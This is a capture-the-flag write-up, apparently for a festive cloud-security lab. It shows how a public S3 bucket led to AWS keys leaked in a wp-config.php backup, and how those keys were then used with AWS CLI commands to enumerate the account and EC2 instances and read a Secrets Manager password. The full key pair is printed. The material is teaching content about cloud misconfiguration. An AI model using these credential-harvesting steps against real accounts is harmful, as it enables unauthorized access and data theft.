# Cloud: Elf Leaks

Author: Corbett Stephens \
Date: 01/07/2022


Shadow IT

Sometimes business units go around corporate IT, procurement, legal, and security when they need to get the job done quickly. This leads to security teams not knowing what they need to protect and systems not built to IT or Security standards. 

Challenge

Somehow, the Grinch has managed to get hold of all the Elves' names and email addresses. How could this have happened? Given the scope of the breach, McSkidy believes someone in HR must be involved. You know that HR recently launched a new portal site using WordPress. You also know that HR didn't request any infrastructure from IT to deploy this portal site. Where is that portal hosted?


![](./pictures/flyer.png)
Checking out the image, the URL reveals that it belongs to the bucket "images.bestfestivalcompany.com".

To check what else is in the bucket: `aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request`

To download content the following command can use `aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request`.

![](./pictures/download.png)

Looking at the backup folder, there exists a `wp-config.php` file. Inside this file, the AWS keys and region can be found. AWS access keys typically start with `AKIAQI52OJVCPZXFYAOI` while secret keys look seemingly random such as `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`. Other key formats can be `AIDA`, `AROA`, or `ASIA` which stand for ID key, role key, and session key respectively. 

![](./pictures/keys.png)

<pre>
Key: AKIAQI52OJVCPZXFYAOI
Secret: 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
Region: us-east-1
</pre>

The Account ID that owns the key can be found by using the command `aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile hr`.

Account ID: `019181489476`

To find the username for the account the following command can be used: `aws sts get-caller-identity --profile hr`.

<pre>
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
</pre>

To find EC2 Instance `aws ec2 describe-instances --output text --profile hr`

<pre>
RESERVATIONS	019181489476	043234062703	r-0e89ba65b28a7c699
INSTANCES	0	x86_64	HR-Po-Insta-1NAKAMW2PPVMT	False	True	xen	ami-0c2b8ca1dad447f8a	i-0c56041ac61cf5a95	t3a.micro	hr-key	2021-11-13T12:36:58.000Z	ip-172-31-68-81.ec2.internal	172.31.68.81		/dev/xvda	ebs	True	User initiated (2021-11-13 12:42:39 GMT)	subnet-00b1107c0c18c0722	hvm	vpc-0235b5a9591606b73
BLOCKDEVICEMAPPINGS	/dev/xvda
EBS	2021-11-13T12:36:59.000Z	True	attached	vol-0ac79339aac8b249d
CAPACITYRESERVATIONSPECIFICATION	open
CPUOPTIONS	1	2
HIBERNATIONOPTIONS	False
METADATAOPTIONS	enabled	1	optional	applied
MONITORING	disabled
NETWORKINTERFACES		interface	16:35:78:d8:60:d1	eni-027945da0ddb79e59	019181489476	ip-172-31-68-81.ec2.internal	172.31.68.81	True	in-use	subnet-00b1107c0c18c0722	vpc-0235b5a9591606b73
ATTACHMENT	2021-11-13T12:36:58.000Z	eni-attach-0d91e2137f6014220	True	0	attached
GROUPS	sg-0c6e7cd87c1c8d035	default
PRIVATEIPADDRESSES	True	ip-172-31-68-81.ec2.internal	172.31.68.81
PLACEMENT	us-east-1f		default
SECURITYGROUPS	sg-0c6e7cd87c1c8d035	default
STATE	80	stopped
STATEREASON	Client.UserInitiatedShutdown	Client.UserInitiatedShutdown: User initiated shutdown
TAGS	aws:cloudformation:stack-id	arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS	aws:cloudformation:logical-id	Instance
TAGS	created_by	Elf McHR
TAGS	aws:cloudformation:stack-name	HR-Portal
TAGS	Name	HR-Portal

</pre>

EC2 instance name: `HR-Portal`.

The database password stored in the Secrets Manager was a little hard to find. First, I had to figure out what the Secrets Manager was and how to use it. While researching, I found a command that would be helpful. `aws secretsmanager list-secrets --profile` then `aws secretsmanager get-secret-value --secret-id HR-Password --region us-east-1`. The output said to try something closer to the Santa in the north. Using the `aws secretsmanager get-secret-value --secret-id HR-Password --profile hr --region eu-north-1` worked which I was able to find with some trail and error. The output is shown in the following picture.

![](./pictures/secret.png)



